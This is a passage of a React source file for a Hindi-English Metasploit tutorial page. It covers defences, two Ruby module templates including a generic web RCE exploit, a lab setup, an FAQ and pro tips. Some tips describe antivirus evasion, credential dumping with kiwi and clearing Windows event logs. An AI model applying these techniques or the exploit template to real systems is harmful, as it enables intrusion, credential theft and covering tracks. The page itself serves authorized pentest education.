        <li><strong className="text-white">Patch Management:</strong> Regular updates — EternalBlue, BlueKeep जैसे exploits patches से fix होते हैं</li>
        <li><strong className="text-white">Firewall:</strong> Unnecessary ports block करें — SMB (445), RDP (3389) बाहर expose न करें</li>
        <li><strong className="text-white">IDS/IPS:</strong> Snort, Suricata — Metasploit payloads detect कर सकते हैं</li>
        <li><strong className="text-white">Antivirus:</strong> Updated AV + EDR solutions — Meterpreter detection</li>
        <li><strong className="text-white">Network Segmentation:</strong> Critical systems isolate करें</li>
        <li><strong className="text-white">Least Privilege:</strong> Users को admin rights न दें</li>
        <li><strong className="text-white">Monitoring:</strong> Suspicious network connections monitor करें</li>
        <li><strong className="text-white">Application Whitelisting:</strong> Unauthorized executables block करें</li>
      </ul>

      <h2>Custom Module Writing</h2>
      <p>
        Metasploit में अपने custom modules लिख सकते हो। Ruby में लिखे जाते हैं। Custom modules तब काम आते हैं जब built-in modules में कोई specific vulnerability cover नहीं होती।
      </p>
      <CodeBlock
        title="Custom Auxiliary Module"
        code={`# ~/.msf4/modules/auxiliary/scanner/http/custom_check.rb में save करो:

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Custom HTTP Checker',
      'Description' => 'Custom vulnerability check',
      'Author'      => ['Your Name'],
      'License'     => MSF_LICENSE
    ))
    register_options([
      OptString.new('TARGETURI', [true, 'Path', '/'])
    ])
  end

  def run_host(ip)
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'vulnerable_page'),
      'method' => 'GET'
    })

    if res && res.code == 200
      print_good("#{ip} - Vulnerable!")
      report_vuln(
        host: ip,
        name: 'Custom Vulnerability',
        refs: []
      )
    end
  end
end

# msfconsole में load करो:
# reload_all
# use auxiliary/scanner/http/custom_check`}
      />
      <CodeBlock
        title="Custom Exploit Module"
        code={`# ~/.msf4/modules/exploits/custom/web_rce.rb में save करो:

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Custom Web RCE',
      'Description'    => 'Web application remote code execution',
      'Author'         => ['Your Name'],
      'License'        => MSF_LICENSE,
      'Platform'       => 'php',
      'Targets'        => [['Automatic', {}]],
      'DefaultTarget'  => 0
    ))
  end

  def exploit
    send_request_cgi({
      'uri'      => '/vulnerable_endpoint',
      'method'   => 'POST',
      'vars_post' => {'cmd' => payload.encoded}
    })
  end
end

# Test करो:
# msfconsole में reload_all
# use exploits/custom/web_rce`}
      />

      <h2>Lab Environment Setup</h2>
      <CodeBlock
        title="Practice Lab"
        code={`# Virtual machines setup:
# 1. Kali Linux (attacker)
# 2. Windows 10/Server (target)
# 3. Metasploitable2 (vulnerable Linux)
# 4. DVWA (web app)

# Network setup:
# VirtualBox Host-Only Adapter
# Subnet: 192.168.56.0/24

# Metasploitable2 download:
# SourceForge से download करें
# VM में import करें

# Practice workflow:
# 1. db_nmap से scan करें
# 2. Services identify करें
# 3. Exploit select करें
# 4. Payload set करें
# 5. Exploit run करें
# 6. Post-exploitation करें`}
      />

      <h2>Frequently Asked Questions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'Metasploit free है?', a: 'हाँ, Community Edition free और open source है। Pro version paid है ($15,000+/year) — लेकिन CE में सब कुछ है।' },
          { q: 'Windows पर चलता है?', a: 'हाँ, लेकिन Linux/Mac पर best performance मिलती है। Kali Linux recommended है।' },
          { q: 'Meterpreter detect हो जाता है?', a: 'Basic Meterpreter detect हो सकता है। Encoding, custom templates, और Veil/Shellter से bypass करें।' },
          { q: 'Custom modules कैसे लिखें?', a: 'Ruby में लिखें। ~/.msf4/modules/ में save करें। reload_all से load करें। Rapid7 docs check करें।' },
          { q: 'Cobalt Strike से better है?', a: 'Different purpose। Metasploit exploitation में best (2000+ exploits)। Cobalt Strike red team operations में best (evasion, C2)। दोनों complementary हैं।' },
          { q: 'क्या real hacking के लिए use कर सकते हैं?', a: 'नहीं! केवल authorized testing के लिए। Unauthorized use illegal है — jail और जुर्माना दोनों हो सकते हैं।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Alternatives</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Tool</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">खासियत</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Cobalt Strike</td><td className="py-2 px-3">Commercial C2 framework</td><td className="py-2 px-3">Advanced evasion, Beacon payload</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Sliver</td><td className="py-2 px-3">Open source C2</td><td className="py-2 px-3">Go-based, cross-platform implants</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Empire</td><td className="py-2 px-3">Post-exploitation framework</td><td className="py-2 px-3">PowerShell/Python agents</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Armitage</td><td className="py-2 px-3">Metasploit GUI</td><td className="py-2 px-3">Visual attack interface</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">RouterSploit</td><td className="py-2 px-3">Router exploitation</td><td className="py-2 px-3">IoT/embedded device focus</td></tr>
          </tbody>
        </table>
      </div>

      <div className="info-box mt-6">
        <strong>💡 Pro Tips:</strong>
        <ul className="list-disc list-inside text-gray-300 mt-2 space-y-1">
          <li>Metasploit + Nmap combo सबसे powerful है — db_nmap से scan करो, results database में save होंगे</li>
          <li>RC scripts से repetitive tasks automate करो — exploit.rc बनाओ और msfconsole -r से run करो</li>
          <li>Meterpreter में migrate करो stable process में (explorer.exe) — session drop नहीं होगा</li>
          <li>Workspace use करो — हर pentest का अलग workspace, results organized रहेंगे</li>
          <li>Stageless payloads ज़्यादा reliable हैं — size बड़ा है but connection stable रहती है</li>
          <li>Payload encoding से basic AV bypass करो — custom templates ज़्यादा effective हैं</li>
          <li>setg command से global options set करो — हर module में बार-बार set नहीं करना पड़ेगा</li>
          <li>db_import से Nmap, Nessus results import करो — manually target नहीं लिखना पड़ेगा</li>
          <li>Post-exploitation में पहले migrate करो, फिर kiwi load करो — stable session में credentials better मिलते हैं</li>
          <li>Resource scripts background में run करो (-j flag) — multiple exploits simultaneously launch होंगे</li>
          <li>हमेशा check command पहले run करो exploit से — vulnerability confirm हो जाए बिना exploit किए</li>
          <li>Meterpreter में clearev command से Windows event logs clear करो</li>
        </ul>
      </div>

      <div className="warning-box mt-6">
        <strong>⚠️ फाइनल वार्निंग:</strong> Metasploit एक बहुत शक्तिशाली exploitation framework है। इसका गलत इस्तेमाल गंभीर कानूनी परिणामों का कारण बन सकता है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत unauthorized exploitation में 3 साल तक की जेल और 2 लाख तक का जुर्माना हो सकता है। केवल authorized testing और अपने lab में ही use करें।
      </div>
    </TutorialLayout>
  )
}
